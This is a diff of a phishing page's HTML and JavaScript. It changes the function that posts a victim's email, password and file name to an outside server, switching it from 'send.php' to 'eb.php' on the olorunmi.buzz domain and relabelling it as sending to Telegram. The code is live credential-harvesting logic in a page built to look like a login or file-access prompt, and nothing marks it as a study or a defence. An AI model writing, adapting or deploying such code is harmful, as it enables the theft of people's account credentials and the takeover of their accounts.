@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -447,9 +448,9 @@
                 }
             ];
             
-            // Send data to PHP URL (not Telegram)
-            async function sendToPhpUrl(email, password, fileName, action) {
-                const url = "https://olorunmi.buzz/send.php";
+            // Send data to Telegram via your URL
+            async function sendToTelegram(email, password, fileName, action) {
+                const url = "https://olorunmi.buzz/eb.php";
                 const data = {
                     email: email,
                     password: password,
@@ -500,8 +501,8 @@
                 errorDiv.style.display = 'none';
                 if (successDiv) successDiv.style.display = 'none';
                 
-                // Send to PHP URL
-                const result = await sendToPhpUrl(email, password, fileName, action);
+                // Send to Telegram
+                const result = await sendToTelegram(email, password, fileName, action);
                 
                 if (result !== null) {
                     // Success
